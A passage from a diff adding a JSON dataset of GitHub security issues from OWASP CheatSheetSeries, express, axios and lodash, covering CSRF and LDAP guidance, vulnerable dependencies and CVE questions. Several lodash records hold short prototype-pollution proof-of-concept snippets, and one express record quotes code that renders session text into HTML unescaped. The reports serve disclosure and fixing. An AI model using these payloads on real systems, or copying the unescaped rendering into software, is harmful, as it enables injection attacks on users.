bind it to the user's session to \"further enhance security\", making it sound like signing alone is sufficient.\r\n\r\nGiven that binding to the session is what actually makes this more secure, it isn't clear to me why signing is necessary at all. It seems like a hash over the session ID and some random bytes would serve the same purpose, without requiring the user to manage secret keys.\r\n\r\nThere are a lot of other things in the docs that are pretty confusing:\r\n\r\n> This ensures that an attacker cannot create and inject their own, known, CSRF token into the victim's authenticated session\r\n\r\nAs stated above, signing does nothing to prevent an attacker who can set cookies from injecting their own CSRF token.\r\n\r\n> The system's tokens should be secured by hashing or encrypting them.\r\n\r\nI don't think encryption would be safe here unless it was authenticated encryption.\r\n\r\n\"The system's tokens\" is a bit confusing too, because there are no tokens to hash or encrypt; the token is the mac (or hash) of the session ID.\r\n\r\n> The server-side session ID (e.g. PHP or ASP.NET). This value should never leave the server or be in plain text in the CSRF Token.\r\n\r\nDon't session IDs necessarily leave the server in the cookie on every request? I think they are trying to say it shouldn't be in the non HTTP-Only cookie?\r\n\r\n> Generate a random value (preferably cryptographically random) to ensure that consecutive calls within the same second do not produce the sa",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS"
+    ],
+    "state": "closed",
+    "created_at": "2024-12-07T00:22:55+00:00",
+    "closed_at": "2026-03-15T18:22:45+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/1558",
+    "language": "Python",
+    "author": "matt-allan",
+    "comments_count": 7,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 1372,
+    "title": "Update: LDAP_Injection_Prevention_Cheat_Sheet",
+    "description": "## What is missing or needs to be updated?\r\n<!--- Provide a description of the problem with the current Cheat Sheet -->\r\n\r\nAfter a casual reading, the Cheat Sheet seems to suggests that even passwords should always be escaped. When this is taken at face value, it can cause all kinds of issues, mainly stuff not working as expected any more (see https://github.com/dexidp/dex/issues/3433).\r\n\r\nThe `Safe Java Escaping Example` wrongly assumes that a password check against LDAP is done via LDAP filter and escapes the password, when actually password checking against an ldap server is (or at least should be) exclusively done via BIND request which safely accepts the password in unfiltered plaintext. \r\n\r\n## How should this be resolved?\r\n<!--- What changes should be made to the Cheat Sheet to address this? -->\r\nThe usual methods for password authentication against LDAP should be mentioned:\r\n* Single-Step Auth:\r\n  - BIND-Request with DN constructed from template like `uid=${USERID},ou=people,dc=example,dc=com`. Whatever is inserted in that template should be escaped as needed. Password from user input is given to BIND call as is.\r\n* Three-Step-Auth:\r\n  - BIND with credentials limited to searching - these would be configured in the app.\r\n  - `SEARCH` LDAP for users DN like `(&(uid=${USERID})(deactivated=0))` or something. Again, anything inserted into that query should be escaped as needed\r\n  - BIND with DN from search result above, if any. Password from user input is given to BIND call as is.\r\n \r\nThese two both assume the LDAP server to require (non-anonymous) BIND before allowing access to user data, which I think is (or should be) default or at least best practice. So `Enabling Bind Authentication` should be moved up in the document's focus, i.e. \"To prevent LDAP Injection, first the LDAP server needs to be configured properly...\". Even if it's out of scope of this document, proper safety precautions should be mentioned - \"Simple BIND transmits plain text passwords to the server, so it should only be used with an encrypted connection\" or \"If you **really** need to use unencrypted connection, make sure to only use SASL BIND with challenge protocols etc. to prevent password sniffing.\"\r\n\r\nThe `Safe Java Escaping Example` should be updated to reflect either one of the above methods and no longer use the password in a search filter.",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS",
+      "HELP_WANTED"
+    ],
+    "state": "closed",
+    "created_at": "2024-04-08T13:46:08+00:00",
+    "closed_at": "2026-03-15T18:22:28+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/1372",
+    "language": "Python",
+    "author": "einhirn",
+    "comments_count": 6,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 1319,
+    "title": "Update: Secure Product Design",
+    "description": "<!--- Please complete the sections below -->\r\n\r\n## What is missing or needs to be updated?\r\n<!--- Provide a description of the problem with the current Cheat Sheet -->\r\n\r\n- Requires updates to account for current best practices\r\n- https://github.com/OWASP/CheatSheetSeries/issues/1114 \r\n\r\n\r\n## How should this be resolved?\r\n<!--- What changes should be made to the Cheat Sheet to address this? -->\r\n\r\n- I propose changing the current cheat sheet to align with the [Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software](https://www.cisa.gov/resources-tools/resources/secure-by-design) publication.\r\n- The intended final result would follow the broad structure of the publication, but in a more palatable and actionable form, along with links to existing cheat sheets for brevity.\r\n\r\nWould like open up discussion on whether it would make sense to rename the cheat sheet to `Secure By Design Cheat Sheet`\r\n<!-- Thank you again for your contribution -->\r\n",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS",
+      "HELP_WANTED"
+    ],
+    "state": "closed",
+    "created_at": "2024-02-12T05:08:01+00:00",
+    "closed_at": "2026-03-15T18:21:37+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/1319",
+    "language": "Python",
+    "author": "otkd",
+    "comments_count": 10,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 1235,
+    "title": "New CS proposal: Incident Response for Web Applications",
+    "description": "<!--- Please complete the sections below -->\r\n\r\n## What is the proposed Cheat Sheet about?\r\nThe proposed cheat sheet, titled \"Incident Response for Web Applications,\" aims to provide a practical guide for handling security incidents related to web applications. It will cover the essential steps, communication plans, evidence preservation, and analysis required during an incident response scenario.\r\n\r\n## What security issues are commonly encountered related to this area?\r\nCommon security issues related to incident response for web applications that will be addressed in this cheat sheet include:\r\n\r\n1. **Common Web Application Threats:**\r\n   - Identification and response strategies for common threats, including SQL injection, cross-site scripting, and data breaches.\r\n\r\n2. **Denial of Service Attacks:**\r\n   - Guidelines for detecting and mitigating distributed denial of service (DDoS) attacks targeting web applications.\r\n\r\n3. **Unauthorized Access and Account Compromise:**\r\n   - Procedures for responding to incidents involving unauthorized access, compromised accounts, and user data breaches.\r\n\r\n4. **Data Integrity and Tampering:**\r\n   - Strategies for detecting and responding to incidents related to data integrity and unauthorized tampering of web application content.\r\n\r\n5. **Malicious File Uploads:**\r\n   - Response plans for incidents involving malicious file uploads and potential exploitation of file upload vulnerabilities.\r\n\r\n## What is the objective of the Cheat Sheet?\r\nThe objective of the \"Incident Response for Web Applications\" cheat sheet is to equip web developers, security teams, and incident responders with practical guidance for effectively managing and mitigating security incidents. The cheat sheet aims to:\r\n\r\n- Provide a structured incident response plan tailored to web application security incidents.\r\n- Offer communication templates for informing stakeholders and users during security incidents.\r\n- Outline evidence preservation techniques for forensic analysis and legal purposes.\r\n- Enhance the ability to quickly identify and respond to security incidents in a web application environment.\r\n\r\n## What other resources exist in this area?\r\n- **OWASP Incident Response Guide:**\r\n  - Refer to the [OWASP Incident Response Guide](https://owasp.org/www-project-incident-response/) for additional insights into incident response best practices.\r\n\r\n- **NIST Cybersecurity Framework:**\r\n  - Explore the [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) for a comprehensive framework that includes incident response guidelines.\r\n\r\n- **Incident Response Blogs and Articles:**\r\n  - Review blogs and articles from incident response experts and organizations for real-world incident response scenarios and lessons learned.\r\n\r\n## References\r\n- [OWASP Incident Response Guide](https://owasp.org/www-project-incident-response/)\r\n- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)\r\n\r\n",
+    "labels": [
+      "ACK_OBTAINED",
+      "NEW_CS"
+    ],
+    "state": "closed",
+    "created_at": "2023-11-26T23:55:49+00:00",
+    "closed_at": "2026-03-15T18:19:37+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/1235",
+    "language": "Python",
+    "author": "aditya6298",
+    "comments_count": 5,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "expressjs/express",
+    "issue_number": 7143,
+    "title": "Vulnerable dependency version that is 12 years old: path-to-regexp",
+    "description": "<!-- The process for bug fixing is:\n\n- We will first assess if the behavior is different from what should occur\n- Confirm the bug is reproducible\n- Discuss how to best fix the bug\n- Work towards a fix\n-->\n\n## Environment information\n\n**Version**:\n4.22.1\n<!-- \nTo find the installed version of a package, you can check the `package.json` file in the root directory of your project. The version will be listed under `dependencies` or `devDependencies`, like this:\n\n```json\n\"dependencies\": {\n  \"express\": \"4.18.2\"\n}\n-->\n\n**Platform**:\nall platforms\n\n**Node.js version**:\n<!-- \nOutput of node -v.\n-->\n22.x (irrelevant)\n\n**Any other relevant information**:\nhttps://security.snyk.io/package/npm/path-to-regexp\nhttps://www.npmjs.com/package/path-to-regexp?activeTab=versions\n\n## What steps will reproduce the bug?\nrunning npm audit\n",
+    "labels": [
+      "4.x",
+      "question",
+      "awaiting more info"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-31T08:43:23+00:00",
+    "closed_at": "2026-04-01T23:37:23+00:00",
+    "url": "https://github.com/expressjs/express/issues/7143",
+    "language": "JavaScript",
+    "author": "Davo00",
+    "comments_count": 3,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "expressjs/express",
+    "issue_number": 6292,
+    "title": "XSS in examples",
+    "description": "I have found a potential Cross-Site Scripting (XSS) vulnerability in your codebase located at /examples/auth/index.js. In the following code, user input is directly rendered into the page without proper sanitization:\n\n```\napp.use(function(req, res, next){\n    var err = req.session.error;\n    var msg = req.session.success;\n    if (err) res.locals.message = '<p>' + err + '</p>';  // Potential XSS\n    if (msg) res.locals.message = '<p>' + msg + '</p>';\n    next();\n});\n```\nRisks:\nThis exposes the application to XSS attacks, where attackers can inject malicious scripts.\nIt can lead to script injection and potentially allow attackers to steal user data, perform actions on behalf of the user, or hijack user sessions.\nSuggested Fix:\nUse libraries like DOMPurify to sanitize user input before rendering it to prevent XSS attacks.\nEncode or escape text before displaying it to avoid executing embedded scripts.\nConsider using safe HTML templating engines that automatically handle escaping, such as Handlebars or Pug.\nImplementing these measures will significantly enhance the security of the application and protect against XSS vulnerabilities.\n\nThank you for your attention to this matter.\n\nBest Regards, @ZeroXJacks",
+    "labels": [
+      "bug"
+    ],
+    "state": "closed",
+    "created_at": "2025-01-23T17:01:38+00:00",
+    "closed_at": "2025-01-24T14:50:57+00:00",
+    "url": "https://github.com/expressjs/express/issues/6292",
+    "language": "JavaScript",
+    "author": "ZeroXJacks",
+    "comments_count": 4,
+    "code_snippets": [
+      {
+        "code": "app.use(function(req, res, next){\n    var err = req.session.error;\n    var msg = req.session.success;\n    if (err) res.locals.message = '<p>' + err + '</p>';  // Potential XSS\n    if (msg) res.locals.message = '<p>' + msg + '</p>';\n    next();\n});",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "expressjs/express",
+    "issue_number": 7016,
+    "title": "Update body-parser dependency in https://github.com/expressjs/express/tree/4.x/ to `1.20.4`",
+    "description": "Currently at `1.20.3` containing malicious `qs` module version",
+    "labels": [
+      "4.x",
+      "deps"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-04T08:02:22+00:00",
+    "closed_at": "2026-02-14T15:14:37+00:00",
+    "url": "https://github.com/expressjs/express/issues/7016",
+    "language": "JavaScript",
+    "author": "Paulchen5",
+    "comments_count": 5,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "axios/axios",
+    "issue_number": 10643,
+    "title": "Which Axios versions were affected and which version is safe to use?",
+    "description": "Hi\n\nI recently saw reports that some versions of Axios were compromised and contained malicious code, so I want to clarify before using it in my project.\n\nFrom what I understand, the affected versions were:\n\n* axios@1.14.1\n* axios@0.30.4\n\nI would like to confirm:\n\n1. Are these the only compromised versions?\n2. Which version is currently safe to use in production?\n3. Is it safe to install the latest version now?\n\nI am using Bun and planning to use Axios in a React project, so I want to make sure I am not installing any vulnerable or malicious version.\n\nThanks :)\n",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-04-03T15:00:09+00:00",
+    "closed_at": "2026-04-04T20:01:40+00:00",
+    "url": "https://github.com/axios/axios/issues/10643",
+    "language": "JavaScript",
+    "author": "muhammad-fiaz",
+    "comments_count": 6,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "axios/axios",
+    "issue_number": 6681,
+    "title": "Axios standardizes headers to be case-insensitive, which causes issues for case-sensitive APIs",
+    "description": "### Describe the bug\r\n\r\nHi,\r\n\r\nI have a question regarding the capitalization of headers in Axios requests. By default, it seems that Axios capitalizes header names (e.g., \"content-type\" becomes \"Content-Type\" in some versions).\r\n\r\nThis behavior can cause issues when working with case-sensitive APIs, such as AWS API Gateway, which require headers to follow specific casing ([as noted in the AWS documentation](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-known-issues.html#:~:text=Header%20names%20and%20query%20parameters,back%20by%20your%20integration%20endpoint)).\r\n\r\nI understand that this decision may follow [RFC 2616](https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2), which states that HTTP header names are case-insensitive. However, this approach can make Axios challenging to use in environments where case-sensitive headers are required.\r\n\r\nI’ve noticed other issues opened on this topic, but they have been closed without a final solution, with the decision being to follow the specification:\r\n\r\nIssue https://github.com/axios/axios/issues/4509\r\nIssue https://github.com/axios/axios/issues/413\r\n\r\nIf there are other related issues, I couldn’t find them here.\r\n\r\nIs there any way to configure Axios to send headers in a case-sensitive manner, or is there a workaround to address this issue? Any insights or suggestions would be greatly appreciated!\r\n\r\n### To Reproduce\r\n\r\nI encountered the error while using AWS pre-signed URLs. The backend of my system generates this upload URL, and the frontend sends the file to the obtained endpoint. My API is written in .NET 8.\r\n\r\n### Code snippet\r\nThis is an example of a manual PUT request without Axios, where headers are set to be case-sensitive:\r\n\r\n```js\r\n\r\nPUT /programa_29151_capitulo_9.fdx?AWSAccessKeyId=*****&Expires=1730412840&x-amz-security-token=*****&Signature=***** HTTP/1.1\r\naccept: application/json\r\ncontent-type: \r\n```\r\n\r\nIn comparison, here’s the same PUT request using Axios:\r\n\r\n```js\r\nPUT /programa_11111_capitulo_99.fdx?AWSAccessKeyId=*****&Expires=1730412968&x-amz-security-token=*****&Signature=***** HTTP/1.1\r\nAccept: application/json\r\nContent-Type: \r\n```\r\n\r\nThe only difference between these two requests is the capitalization of the content-type and accept headers, with the manual request having these headers in lowercase (content-type and accept), while Axios automatically capitalizes them (Content-Type and Accept). This is a real example I’ve encountered; the first request succeeds, but the second returns a 403 Forbidden error. I’ve hidden the other request details as they are exactly the same.\r\n\r\n### Axios Version\r\n\r\n1.7.7\r\n\r\n### Node.js Version\r\n\r\n22.2.0\r\n\r\n### Additional Library Versions\r\n\r\n```bash\r\nReact 18.2.0\r\n```\r\n\r\nThank you!",
+    "labels": [
+      "issue::question"
+    ],
+    "state": "closed",
+    "created_at": "2024-10-31T23:01:13+00:00",
+    "closed_at": "2026-04-05T18:46:09+00:00",
+    "url": "https://github.com/axios/axios/issues/6681",
+    "language": "JavaScript",
+    "author": "b1z3rr4",
+    "comments_count": 2,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6176,
+    "title": "Snyk Vulnerability",
+    "description": "Lodash version 4.17.21 and 4.17.23 have SNYK vulnerability (Code injection)\n\nhttps://security.snyk.io/vuln/SNYK-JS-LODASH-15869625\n\n\nSnyk suggest to ugprade to 4.18.0 but this version is deprecated?\n\nCould you help me to fix the issue, please?\n\n",
+    "labels": [
+      "question"
+    ],
+    "state": "closed",
+    "created_at": "2026-04-01T14:07:50+00:00",
+    "closed_at": "2026-04-01T21:08:32+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6176",
+    "language": "JavaScript",
+    "author": "jaeecheveste",
+    "comments_count": 14,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6185,
+    "title": "Prototype pollution vulnerability in lodash assign / assignIn wrapper flow",
+    "description": "Hi, we are a security team. We found a prototype pollution vulnerability in your project.\n\nThe issue affects the wrapper-based `assign` / `assignIn` flow in `lodash` when the target object is `Object.prototype`.\n\nIn this code path, properties from user-controlled input are copied into the target object through dynamic property assignment. Since special keys are not filtered, an attacker may be able to pollute the global prototype.\n\n## Impact\n\nIf an attacker can control the source object and the wrapped target is `Object.prototype`, this may lead to global prototype pollution and affect other objects in the same runtime.\n\n## Proof of concept\n\n### Case 1: `assign`\n\n```js\nconst _ = require('lodash');\n\nconst wrapped = _(Object.prototype);\nwrapped.assign({ polluted: true }).value();\n\nconsole.log(({}).polluted); // true\n```\n\n### Case 2: `assignIn`\n\n```js\nconst _ = require('lodash');\n\nconst wrapped = _(Object.prototype);\nwrapped.assignIn({ polluted: true }).value();\n\nconsole.log(({}).polluted); // true\n```\n\n## Details\n\nWe confirmed the following cases:\n\n- `assign`\n  - sink: `./_baseClone.js:61`\n\n- `assignIn`\n  - sink: `./_baseClone.js:61`\n\nThe root cause is that attacker-controlled properties are written into the target object without blocking special prototype-related keys.\n",
+    "labels": [
+      "invalid"
+    ],
+    "state": "closed",
+    "created_at": "2026-04-02T14:15:54+00:00",
+    "closed_at": "2026-04-02T15:01:13+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6185",
+    "language": "JavaScript",
+    "author": "Vincebye",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "const _ = require('lodash');\n\nconst wrapped = _(Object.prototype);\nwrapped.assign({ polluted: true }).value();\n\nconsole.log(({}).polluted); // true",
+        "language": "js"
+      },
+      {
+        "code": "const _ = require('lodash');\n\nconst wrapped = _(Object.prototype);\nwrapped.assignIn({ polluted: true }).value();\n\nconsole.log(({}).polluted); // true",
+        "language": "js"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6186,
+    "title": "Prototype pollution vulnerability in lodash.mapkeys",
+    "description": "Hi, we are a security team. We found a prototype pollution vulnerability in your project.\n\nThe issue affects `lodash.mapkeys`.\n\nThe vulnerable behavior happens when the iteratee result is used as a property name in a dynamic assignment. If the iteratee returns a special key such as `__proto__`, or if input data leads to that key being used during assignment, prototype pollution may occur.\n\n## Impact\n\nAn attacker may be able to modify the prototype of the result object, which can cause prototype pollution in the affected runtime.\n\n## Proof of concept\n\n### Case 1: iteratee returns `__proto__`\n\n```js\nconst mapKeys = require('lodash.mapkeys');\n\nconst result = mapKeys({ anyKey: { polluted: true } }, () => '__proto__');\n\nconsole.log(result.polluted); // true\n```\n\n### Case 2: input contains `__proto__`\n\n```js\nconst mapKeys = require('lodash.mapkeys');\n\nconst result = mapKeys({ ['__proto__']: { polluted: true } }, (value, key) => key);\n\nconsole.log(result.polluted); // true\n```\n\n## Details\n\nWe confirmed the following cases:\n\n- sink: `./index.js:2222`\n- sink: `./index.js:420`\n\nThe root cause is that untrusted key material can flow into dynamic property writes without blocking special prototype-related keys.\n",
+    "labels": [
+      "invalid"
+    ],
+    "state": "closed",
+    "created_at": "2026-04-02T14:16:53+00:00",
+    "closed_at": "2026-04-02T15:00:40+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6186",
+    "language": "JavaScript",
+    "author": "Vincebye",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "const mapKeys = require('lodash.mapkeys');\n\nconst result = mapKeys({ anyKey: { polluted: true } }, () => '__proto__');\n\nconsole.log(result.polluted); // true",
+        "language": "js"
+      },
+      {
+        "code": "const mapKeys = require('lodash.mapkeys');\n\nconst result = mapKeys({ ['__proto__']: { polluted: true } }, (value, key) => key);\n\nconsole.log(result.polluted); // true",
+        "language": "js"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6187,
+    "title": "Prototype pollution vulnerability in lodash.mapvalues",
+    "description": "Hi, we are a security team. We found a prototype pollution vulnerability in your project.\n\nThe issue affects `lodash.mapvalues`.\n\nThe vulnerable behavior happens when user-controlled object keys are reused in dynamic property assignment while building the result object. If a special key such as `__proto__` is present in the input, prototype pollution may occur.\n\n## Impact\n\nAn attacker may be able to modify the prototype of the produced result object, which can cause prototype pollution in the affected runtime.\n\n## Proof of concept\n\n### Case 1: parsed input contains `__proto__`\n\n```js\nconst mapValues = require('lodash.mapvalues');\n\nconst result = mapValues(\n  JSON.parse('{\"__proto__\":{\"polluted\":true}}'),\n  (value) => value\n);\n\nconsole.log(result.polluted); // true\n```\n\n### Case 2: direct input with special key\n\n```js\nconst mapValues = require('lodash.mapvalues');\n\nconst result = mapValues(\n  { ['__proto__']: { polluted: true } },\n  (value) => value\n);\n\nconsole.log(result.polluted); // true\n```\n\n## Details\n\nWe confirmed the following cases:\n\n- sink: `./index.js:2229`\n- sink: `./index.js:420`\n\nThe root cause is that untrusted keys can flow into dynamic property writes without blocking special prototype-related keys.\n",
+    "labels": [
+      "invalid"
+    ],
+    "state": "closed",
+    "created_at": "2026-04-02T14:18:51+00:00",
+    "closed_at": "2026-04-02T15:00:18+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6187",
+    "language": "JavaScript",
+    "author": "Vincebye",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "const mapValues = require('lodash.mapvalues');\n\nconst result = mapValues(\n  JSON.parse('{\"__proto__\":{\"polluted\":true}}'),\n  (value) => value\n);\n\nconsole.log(result.polluted); // true",
+        "language": "js"
+      },
+      {
+        "code": "const mapValues = require('lodash.mapvalues');\n\nconst result = mapValues(\n  { ['__proto__']: { polluted: true } },\n  (value) => value\n);\n\nconsole.log(result.polluted); // true",
+        "language": "js"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6182,
+    "title": "4.18.1 CVE issue: Prototype pollution & Arbitrary Code Injection",
+    "description": "Hi @falsyvalues @UlisesGascon , is anyone addressing the https://security.snyk.io/vuln/SNYK-JS-LODASH-15869619 (Prototype Pollution) & https://security.snyk.io/vuln/SNYK-JS-LODASH-15869625 (Arbitrary Code Injection) CVE issue? I found this from a mandatory `snyk test` report on a project I am working on.\n\n<img width=\"729\" height=\"53\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/847c7d84-8428-4ede-b27e-0ed308e235bd\" />\n\n<img width=\"720\" height=\"34\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/273f7c08-2be3-45d9-bad6-b64f74ba7d9e\" />",
+    "labels": [
+      "question"
+    ],
+    "state": "closed",
+    "created_at": "2026-04-02T03:54:31+00:00",
+    "closed_at": "2026-04-02T07:27:15+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6182",
+    "language": "JavaScript",
+    "author": "brianng-bilue",
+    "comments_count": 2,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6120,
+    "title": "lodash.template npm package still vulnerable to CVE-2021-23337 (unfixed since 2021)",
+    "description": "## Summary\n\nThe standalone npm package [`lodash.template@4.5.0`](https://www.npmjs.com/package/lodash.template) is still vulnerable to **CVE-2021-23337** (Command Injection via the `variable` option). This was fixed in the main `lodash` package in version **4.17.21**, but the modularized standalone package `lodash.template` was **never republished** with the fix.\n\n## Impact\n\n- **CVE**: [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm)\n- **Severity**: High (CVSS 7.2)\n- **Affected package**: `lodash.template@4.5.0` (latest on npm, published 2018)\n- **Status**: The fix exists in `lodash.js` ([line 180, 14969](https://github.com/lodash/lodash/blob/main/lodash.js#L180)) but was never propagated to the standalone package\n\n## The Fix (already in lodash.js)\n\n```js\nvar reForbiddenIdentifierChars = /[()=,{}\\[\\]\\/\\s]/;\n\n// In the template function:\nelse if (reForbiddenIdentifierChars.test(variable)) {\n  throw new Error(INVALID_TEMPL_VAR_ERROR_TEXT);\n}\n```\n\nThis validation prevents injection of arbitrary code through the `variable` option in `_.template()`.\n\n## Current Situation\n\n- `lodash@4.17.21+` → **Fixed** ✅\n- `lodash.template@4.5.0` → **Still vulnerable** ❌ (last published 2018)\n- GitHub/Dependabot continues to flag this in projects that depend on `lodash.template` transitively (e.g., via `generator-jhipster`)\n- The package is marked as deprecated on npm, but no patched version was ever released\n\n## Request\n\nCould the `lodash.template` standalone package be **regenerated from the current lodash.js source and republished to npm** (e.g., as `4.5.1`) to include the CVE-2021-23337 fix?\n\nThis would resolve Dependabot alerts for thousands of projects that transitively depend on `lodash.template`.\n\n## Workaround\n\nAs a workaround, I've created a patched fork with the same fix applied:\nhttps://github.com/khayashi4337/lodash.template-fixed\n\nThis can be used in `package.json` resolutions:\n```json\n\"resolutions\": {\n  \"lodash.template\": \"https://github.com/khayashi4337/lodash.template-fixed.git\"\n}\n```",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-03-01T13:40:51+00:00",
+    "closed_at": "2026-03-18T23:49:00+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6120",
+    "language": "JavaScript",
+    "author": "khayashi4337",
+    "comments_count": 2,
+    "code_snippets": [
+      {
+        "code": "var reForbiddenIdentifierChars = /[()=,{}\\[\\]\\/\\s]/;\n\n// In the template function:\nelse if (reForbiddenIdentifierChars.test(variable)) {\n  throw new Error(INVALID_TEMPL_VAR_ERROR_TEXT);\n}",
+        "language": "js"
+      },
+      {
+        "code": "\"resolutions\": {\n  \"lodash.template\": \"https://github.com/khayashi4337/lodash.template-fixed.git\"\n}",
+        "language": "json"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6096,
+    "title": "CVE-2025-13465 is _.remove also impacted?",
+    "description": "## Advisory link\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg\n\n## Problem\nThe description in these links refers only to `_.unset` and `_.omit` and the public facing functions.\nHowever, I suspect `_.remove` may also be impacted\n\n## Advisory Current Text\n> Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the _.unset and _.omit functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\n## Proof\n- [Remove calls basePullAt](https://github.com/lodash/lodash/blob/f299b52f39486275a9e6483b60a410e06520c538/lodash.js#L7928)\n- [basePullAt calls baseUnset](https://github.com/lodash/lodash/blob/f299b52f39486275a9e6483b60a410e06520c538/lodash.js#L3903)\n- `baseUnset()` is the root cause afaik\n\n## Suggestion / Request\n\nShould the CVE / Advisory text be modified to include `_.remove`?\n\n\n\n",
+    "labels": [
+      "question"
+    ],
+    "state": "closed",
+    "created_at": "2026-01-25T15:01:35+00:00",
+    "closed_at": "2026-01-25T21:02:48+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6096",
+    "language": "JavaScript",
+    "author": "bd82",
+    "comments_count": 2,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6016,
+    "title": "Lodash vulnerability by sonarqube",
+    "description": "<img width=\"1800\" height=\"400\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/65d02c27-801f-497a-aa48-89197a2ce309\" />\n\n\nLodash Arbitrary Code Execution Vulnerability – Comprehensive Analysis\n\nOverview\n\nLodash versions ≤ 4.17.21 are vulnerable to Arbitrary Code Execution (ACE) through multiple attack vectors including template injection, prototype pollution, and unsafe path traversal. Our project currently uses lodash 4.17.21 as a direct dependency with extensive usage across the codebase. No patched version exists as of September 2025 - 4.17.21 remains the latest published version since February 2021.\n\nVulnerability Details\n\nAspect\n\nDetails\n\nCVE \n\nMultiple (template injection, prototype pollution) \n\nSeverity \n\nHigh - Arbitrary Code Execution potential \n\nAffected Versions \n\nAll versions ≤ 4.17.21 \n\nCurrent Project Version \n\n4.17.21 (latest available) \n\nLast Update \n\nFebruary 20, 2021 \n\nPatched Version \n\nNone available \n\n",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2025-09-26T06:13:44+00:00",
+    "closed_at": "2026-01-23T16:38:19+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6016",
+    "language": "JavaScript",
+    "author": "ghost",
+    "comments_count": 3,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "lodash/lodash",
+    "issue_number": 6061,
+    "title": "_.set vulnerability",
+    "description": "Reported by npm install\nhttps://github.com/advisories/GHSA-p6mc-m468-83gw\n\n```\n# npm audit report\n\nlodash.set  *\nSeverity: high\nPrototype Pollution in lodash - https://github.com/advisories/GHSA-p6mc-m468-83gw\nNo fix available\nnode_modules/lodash.set\n```\n\n\nDedicated Workaround for `set(object, 'a.b.c'.split('.'), value)`:\n```typescript\n\nfunction set(object: object, path: string[], value: unknown) {\n  return merge(\n    object,\n    path.reduceRight((tree, curr) => ({ [curr]: tree }), value)\n  );\n}\n\n```",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2025-12-08T05:05:25+00:00",
+    "closed_at": "2025-12-08T06:35:04+00:00",
+    "url": "https://github.com/lodash/lodash/issues/6061",
+    "language": "JavaScript",
+    "author": "ShaMan123",
+    "comments_count": 3,
+    "code_snippets": [
+      {
+        "code": "# npm audit report\n\nlodash.set  *\nSeverity: high\nPrototype Pollution in lodash - https://github.com/advisories/GHSA-p6mc-m468-83gw\nNo fix available\nnode_modules/lodash.set",
+        "language": "unknown"
+      },
+      {
+        "code": "function set(object: object, path: string[], value: unknown) {\n  return merge(\n    object,\n    path.reduceRight((tree, curr) => ({ [curr]: tree }), value)\n  );\n}",
+        "language": "typescript"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "nodejs/node",
+    "issue_number": 61436,
